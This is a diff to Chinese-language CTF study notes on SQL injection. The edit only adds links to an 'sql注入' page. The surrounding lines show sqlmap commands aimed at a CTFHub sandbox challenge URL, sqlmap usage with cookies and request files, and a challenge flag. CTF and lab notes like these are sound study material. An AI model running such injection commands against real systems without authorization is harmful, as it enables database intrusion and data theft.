@@ -11,8 +11,8 @@ ctfhub{f797878b77751f2aa52c00bd}
 #### 检测注入点
 
 ```cobol
-sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1"             //检测过程中需要手动输入y/n，即是否继续进行sql注入检测
-sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" --batch     //检测过程中默认继续进行sql注入检测
+sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1"             //检测过程中需要手动输入y/n，即是否继续进行[sql注入](sql注入.md)检测
+sqlmap -u "http://challenge-ee02641a7b40090e.sandbox.ctfhub.com:10800/?id=1" --batch     //检测过程中默认继续进行[sql注入](sql注入.md)检测
 ```
 
 #### 产看所有数据库
@@ -150,3 +150,4 @@ sqlmap -r xxx.txt
 ```csharp
 sqlmap -u 完整curl --cookie 'cookie'（单引号和双引号都行）
 ```
+[sql注入](sql注入.md)
